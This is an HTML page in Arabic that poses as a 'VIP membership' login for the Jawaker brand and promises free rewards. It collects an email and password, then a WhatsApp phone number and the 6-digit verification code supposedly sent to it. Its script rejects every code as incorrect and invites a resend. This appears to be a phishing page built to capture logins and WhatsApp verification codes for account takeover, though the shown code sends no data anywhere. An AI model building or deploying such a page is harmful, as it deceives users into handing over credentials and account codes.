<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=1.0" />
<title>عضوية VIP</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght=500;600;700&family=Inter:wght=400;500;600;700&display=swap');
@import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css');

:root {
  --bg: #29292b;
  --card: #1c1c1e;
  --card-border: #3a3a3d;
  --text: #edeff3;
  --text-dim: #9a9a9e;
  --gold: #c9a227;
  --gold-soft: rgba(201, 162, 39, 0.15);
  --green: #24af4b; 
  --green-dim: #0d3819; /* أخضر مطفأ وداكن */
  --silver: #8e8e93; /* اللون الفضي لإعادة الإرسال */
  --red: #e5484d;
}
* { box-sizing: border-box; }
html, body { height: 100%; }
body {
  position: relative;
  margin: 0; min-height: 100vh;
  display: flex; flex-direction: column;
  background-color: #1a1a1c;
  font-family: 'Inter', sans-serif; color: var(--text);
  overflow-x: hidden;
}
body::before {
  content: '';
  position: fixed;
  top: 0; right: 0; bottom: 0; left: 0;
  background-color: #1a1a1c;
  background-image: url('background.png');
  background-repeat: repeat;
  background-size: 220px 220px;
  background-position: top right;
  z-index: -1;
}

/* ---------------- الهيدر ---------------- */
.site-header {
  position: relative;
  background: #000000;
  height: 70px;
  display: flex; align-items: center; justify-content: space-between;
  padding: 0 20px;
  flex-shrink: 0;
}
.header-logo { max-height: 52px; max-width: 160px; object-fit: contain; }
.header-lines { display: flex; flex-direction: column; gap: 4px; }
.header-lines span { display: block; width: 24px; height: 3px; background: #ffffff; border-radius: 2px; }

/* ---------------- منطقة المحتوى ---------------- */
.main-content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
.card {
  position: relative; width: 100%; max-width: 500px;
  background: rgba(8, 8, 9, 0.55); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
  border: 1px solid var(--card-border); border-radius: 14px; padding: 24px 30px 26px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
}
.eyebrow { font-size: 20px; font-weight: 700; color: var(--gold); text-align: left; margin-bottom: 12px; }
.eyebrow-divider { border-bottom: 2px solid #ffffff; opacity: 0.55; margin-bottom: 20px; }
h1 { font-family: 'Cormorant Garamond', serif; font-size: 26px; font-weight: 600; text-align: center; margin: 0 0 22px; }
.field-group { position: relative; margin-bottom: 18px; }
.field-group input {
  width: 100%; padding: 13px 14px; background: #ffffff; border: 1px solid var(--card-border); border-radius: 12px;
  color: #17171a; font-size: 13px; outline: none; text-align: left; direction: ltr;
}
.promo-divider { border-top: 1px solid rgba(237, 239, 243, 0.3); margin: 20px 0 14px; }
.promo-text { text-align: center; color: var(--gold); font-weight: 600; font-size: 13px; }
#accessBtn { width: 45%; display: block; }
button:hover { filter: brightness(1.08); }

.social-login-container { display: flex; justify-content: center; gap: 20px; margin-top: 20px; }
.social-icon-btn { display: flex; align-items: center; justify-content: center; width: 46px; height: 46px; border-radius: 50%; font-size: 22px; text-decoration: none; transition: all 0.25s ease; }
.social-icon-btn.facebook { background: #1877f2; color: #ffffff; }
.social-icon-btn.whatsapp { background: #25d366; color: #ffffff; }

/* ---------------- النوافذ المنبثقة (Modals) ---------------- */
.whatsapp-modal-overlay {
  position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7);
  display: flex; align-items: center; justify-content: center; z-index: 9999; opacity: 0; visibility: hidden; transition: all 0.3s ease;
}
.whatsapp-modal-overlay.active { opacity: 1; visibility: visible; }
.whatsapp-modal {
  width: 94%; max-width: 440px; background: #232325; border: 1px solid #323234; border-radius: 22px; padding: 24px; box-shadow: 0 12px 40px rgba(0,0,0,0.6); position: relative;
}
.modal-close-btn { position: absolute; top: 22px; left: 22px; font-size: 24px; color: #a1a1a5; cursor: pointer; }
.modal-title { text-align: center; font-size: 20px; font-weight: 700; color: #ffffff; margin-bottom: 24px; }
.modal-inner-box { background: #171719; border-radius: 14px; padding: 22px 18px; margin-bottom: 20px; }
.modal-instruction { text-align: center; color: #b5b5b9; font-size: 15px; margin-bottom: 18px; }

.phone-input-container { display: flex; align-items: center; background: #0f0f10; border: 1px solid #28282a; border-radius: 12px; padding: 4px 14px; direction: ltr; }
.country-select-wrapper { display: flex; align-items: center; gap: 8px; padding-right: 12px; border-right: 1px solid #232325; position: relative; }
.flag-circle { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; font-size: 20px; }
.country-select { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
.country-display-code { color: #ffffff; font-size: 16px; font-weight: 500; }
.phone-field { flex: 1; background: transparent; border: none; color: #ffffff; font-size: 17px; padding: 12px 10px; outline: none; }

/* زر إرسال الواتساب المعدل: عريض، ارتفاع أقل، ولون مطفأ */
.whatsapp-submit-btn {
  width: 100%; padding: 12px; /* تقليل الارتفاع */
  background: var(--green-dim); /* أخضر مطفأ عليه سواد */
  border: none; border-radius: 12px;
  color: rgba(255, 255, 255, 0.4); font-weight: 700; font-size: 16px;
  display: flex; align-items: center; justify-content: center; gap: 12px;
  cursor: not-allowed; transition: all 0.25s ease;
  flex-direction: row-reverse;
}
.whatsapp-submit-btn.ready-green {
  background: var(--green) !important; /* يخضر بالكامل */
  color: #ffffff !important;
  cursor: pointer !important;
}

/* ---------------- حقل الرمز المتطور والشحطات الثابتة ---------------- */
.otp-container-relative {
  position: relative; width: 100%; max-width: 280px; margin: 10px auto 0;
}
.otp-wrapper-custom {
  width: 100%; background: #0f0f10; border: 1px solid #28282a;
  border-radius: 12px; height: 48px; /* تقليل الارتفاع */
  position: relative; overflow: hidden;
}
/* حقل شفاف بالكامل فوق الشحطات */
.otp-hidden-input {
  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
  background: transparent; border: none; outline: none !important; /* إلغاء التحديد الذهبي */
  color: #ffffff; font-size: 20px; font-weight: 700; text-align: center;
  letter-spacing: 24px; padding-left: 18px; direction: ltr; z-index: 2;
}
/* طبقة الشحطات البيضاء الثابتة بالأسفل */
.otp-under-lines {
  position: absolute; bottom: 8px; left: 0; width: 100%;
  display: flex; justify-content: center; gap: 14px; direction: ltr; z-index: 1;
  pointer-events: none; padding: 0 10px;
}
.otp-under-lines span {
  width: 24px; height: 3px; background: #ffffff; display: block; border-radius: 1px;
}

.counter-text { text-align: center; font-size: 14px; color: #b5b5b9; margin: 16px 0; }

/* أزرار أسفل نافذة الرمز: الربط يمين، الإعادة يسار، خط عريض وكبير */
.modal-actions-row { display: flex; gap: 12px; margin-top: 15px; flex-direction: row-reverse; } /* عكس الاتجاه لتصبح الربط يمين */
.modal-btn {
  flex: 1; padding: 11px; /* تقليل الارتفاع */
  border-radius: 12px; font-weight: 700; font-size: 16px; /* خط كبير وغامق */
  cursor: not-allowed; border: none; text-align: center; transition: all 0.25s;
  color: rgba(255, 255, 255, 0.3);
}
/* زر الربط (يمين) */
.modal-btn.btn-link { background: #0f1c12; }
.modal-btn.btn-link.active-green { background: #0d421a; color: #ffffff; cursor: pointer; border: 1px solid #165c27; }

/* زر إعادة الإرسال (يسار) - يتحول إلى فضي */
.modal-btn.btn-resend { background: #131314; }
.modal-btn.btn-resend.active-silver { background: var(--silver); color: #ffffff; cursor: pointer; }

/* ---------------- نافذة تنبيه الخطأ ---------------- */
.error-alert-overlay {
  position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8);
  display: flex; align-items: center; justify-content: center; z-index: 10000; opacity: 0; visibility: hidden; transition: all 0.25s;
}
.error-alert-overlay.active { opacity: 1; visibility: visible; }
.error-alert-box { background: #232325; border: 1px solid #323234; border-radius: 18px; width: 85%; max-width: 380px; padding: 30px 20px; text-align: center; }
.error-alert-text { color: #edeff3; font-size: 18px; font-weight: 500; margin: 0; }

.view { display: none; }
.view.active { display: block; }
.site-footer { padding: 22px 24px; background-color: #1c1c1e; border-top: 1px solid rgba(237, 239, 243, 0.25); text-align: center; font-size: 12px; color: var(--text-dim); }
</style>
</head>
<body>

  <header class="site-header">
    <img src="logo.png" alt="Logo" class="header-logo" onerror="this.style.display='none'">
    <div class="header-lines"><span></span><span></span><span></span></div>
  </header>

  <div class="main-content">
    <div class="card view active" id="view-access">
      <div class="eyebrow">VIP Domain</div>
      <div class="eyebrow-divider"></div>
      <form id="accessForm">
        <div class="field-group"><input type="email" id="accEmail" placeholder="Email" required /></div>
        <div class="field-group"><input type="password" id="accPassword" placeholder="Password" required /></div>
        <button type="submit" id="accessBtn">Login</button>
      </form>
      <div class="social-login-container">
        <a href="#" class="social-icon-btn facebook"><i class="fab fa-facebook-f"></i></a>
        <a href="#" class="social-icon-btn whatsapp" onclick="event.preventDefault(); toggleModal(true);"><i class="fab fa-whatsapp"></i></a>
      </div>
      <div class="promo-divider"></div>
      <div class="promo-text">Join VIP Now &amp; Claim Your Free Rewards</div>
    </div>
  </div>

  <!-- النافذة المنبثقة الشاملة -->
  <div class="whatsapp-modal-overlay" id="whatsappModalOverlay" onclick="toggleModal(false)">
    <div class="whatsapp-modal" onclick="event.stopPropagation()">
      <div class="modal-close-btn" onclick="toggleModal(false)"><i class="fas fa-times"></i></div>
      
      <!-- الشاشة الأولى: رقم الهاتف -->
      <div class="main-modal-body" id="mainModalBody">
        <div class="modal-title">وثّق حسابك</div>
        <div class="modal-inner-box">
          <div class="modal-instruction">أدخل رقم هاتفك لربط حسابك</div>
          <div class="phone-input-container">
            <div class="country-select-wrapper">
              <div class="flag-circle" id="currentFlag">🇯🇴</div>
              <i class="fas fa-chevron-down chevron-icon"></i>
              <div class="country-display-code" id="currentCode">(+962)</div>
              <select class="country-select" id="countrySelect" onchange="updateCountryUI()">
                <option value="+962" data-flag="🇯🇴" data-len="9">الأردن (+962)</option>
                <option value="+963" data-flag="🇸🇾" data-len="9">سوريا (+963)</option>
                <option value="+966" data-flag="🇸🇦" data-len="9">السعودية (+966)</option>
              </select>
            </div>
            <input type="tel" class="phone-field" id="whatsappPhone">
          </div>
        </div>
        <button class="whatsapp-submit-btn" id="submitPhoneBtn" onclick="goToSMSPage()">
          <i class="fab fa-whatsapp"></i> أرسل رمز التحقّق عبر واتساب
        </button>
      </div>

      <!-- الشاشة الثانية: رمز التحقق والعداد -->
      <div class="main-modal-body view" id="smsModalBody">
        <div class="modal-title">أدخل رمز التحقّق</div>
        <div class="modal-inner-box">
          <div class="modal-instruction" id="smsInstructionText">أدخل رمز التحقق المكون من 6 أرقام</div>
          
          <!-- حقل الرمز الجديد بالشحطات الثابتة بالأسفل وعرض أقل -->
          <div class="otp-container-relative">
            <div class="otp-wrapper-custom">
              <input type="text" class="otp-hidden-input" id="otpInput" maxlength="6">
              <div class="otp-under-lines">
                <span></span><span></span><span></span><span></span><span></span><span></span>
              </div>
            </div>
          </div>

        </div>
        
        <div class="counter-text" id="countdownLabel">أعد إرسال رمز التحقق خلال 30 ثانية</div>
        
        <div class="modal-actions-row">
          <button class="modal-btn btn-link" id="linkBtn" onclick="triggerErrorAlert()">ربط</button>
          <button class="modal-btn btn-resend" id="resendBtn" onclick="handleResendClick()">إعادة الإرسال</button>
        </div>
      </div>

    </div>
  </div>

  <!-- تنبيه الخطأ المخصص -->
  <div class="error-alert-overlay" id="errorAlertOverlay" onclick="closeErrorAlert()">
    <div class="error-alert-box">
      <p class="error-alert-text">رمز التحقق غير صحيح</p>
    </div>
  </div>

  <footer class="site-footer">جميع الحقوق محفوظة لـ جواكر © 2026</footer>

<script>
let timerInterval = null;
let secondsLeft = 30;

function toggleModal(show) {
  const overlay = document.getElementById('whatsappModalOverlay');
  if (show) {
    overlay.classList.add('active');
    resetToFirstPage();
  } else {
    overlay.classList.remove('active');
    clearInterval(timerInterval);
  }
}

function resetToFirstPage() {
  document.getElementById('mainModalBody').style.display = 'block';
  document.getElementById('smsModalBody').style.display = 'none';
  document.getElementById('whatsappPhone').value = '';
  document.getElementById('otpInput').value = '';
  updateCountryUI();
}

function updateCountryUI() {
  const select = document.getElementById('countrySelect');
  const selectedOption = select.options[select.selectedIndex];
  document.getElementById('currentFlag').textContent = selectedOption.getAttribute('data-flag');
  document.getElementById('currentCode').textContent = `(${selectedOption.value})`;
  checkPhoneLength();
}

function checkPhoneLength() {
  const select = document.getElementById('countrySelect');
  const selectedOption = select.options[select.selectedIndex];
  const reqLen = parseInt(selectedOption.getAttribute('data-len'));
  const phoneVal = document.getElementById('whatsappPhone').value.replace(/\D/g, '');
  const submitBtn = document.getElementById('submitPhoneBtn');

  if (phoneVal.length === reqLen) {
    submitBtn.classList.add('ready-green');
  } else {
    submitBtn.classList.remove('ready-green');
  }
}

document.getElementById('whatsappPhone').addEventListener('input', function() {
  this.value = this.value.replace(/\D/g, '');
  checkPhoneLength();
});

function goToSMSPage() {
  const submitBtn = document.getElementById('submitPhoneBtn');
  if (!submitBtn.classList.contains('ready-green')) return;

  const select = document.getElementById('countrySelect');
  const code = select.value;
  const phone = document.getElementById('whatsappPhone').value;

  document.getElementById('smsInstructionText').textContent = `أدخل رمز التحقّق المكوّن من 6 أرقام الذي وصل إلى الرقم ${code}${phone} عبر واتساب`;
  
  document.getElementById('mainModalBody').style.display = 'none';
  document.getElementById('smsModalBody').style.display = 'block';
  
  startCountdown();
}

function startCountdown() {
  clearInterval(timerInterval);
  secondsLeft = 30;
  const label = document.getElementById('countdownLabel');
  const resendBtn = document.getElementById('resendBtn');
  
  resendBtn.classList.remove('active-silver');
  label.textContent = `أعد إرسال رمز التحقق خلال ${secondsLeft} ثانية`;

  timerInterval = setInterval(() => {
    secondsLeft--;
    if (secondsLeft <= 0) {
      clearInterval(timerInterval);
      label.textContent = `يمكنك إعادة إرسال الرمز الآن`;
      resendBtn.classList.add('active-silver');
    } else {
      label.textContent = `أعد إرسال رمز التحقق خلال ${secondsLeft} ثانية`;
    }
  }, 1000);
}

function handleResendClick() {
  const resendBtn = document.getElementById('resendBtn');
  if (!resendBtn.classList.contains('active-silver')) return;
  
  document.getElementById('otpInput').value = ''; // مسح الحقل فوراً عند النقر
  checkOTPInput();
  startCountdown(); 
}

document.getElementById('otpInput').addEventListener('input', function() {
  this.value = this.value.replace(/\D/g, '');
  checkOTPInput();
});

function checkOTPInput() {
  const otpVal = document.getElementById('otpInput').value;
  const linkBtn = document.getElementById('linkBtn');
  if (otpVal.length === 6) {
    linkBtn.classList.add('active-green');
  } else {
    linkBtn.classList.remove('active-green');
  }
}

function triggerErrorAlert() {
  const linkBtn = document.getElementById('linkBtn');
  if (!linkBtn.classList.contains('active-green')) return;
  document.getElementById('errorAlertOverlay').classList.add('active');
}

function closeErrorAlert() {
  document.getElementById('errorAlertOverlay').classList.remove('active');
}
</script>
</body>
</html>
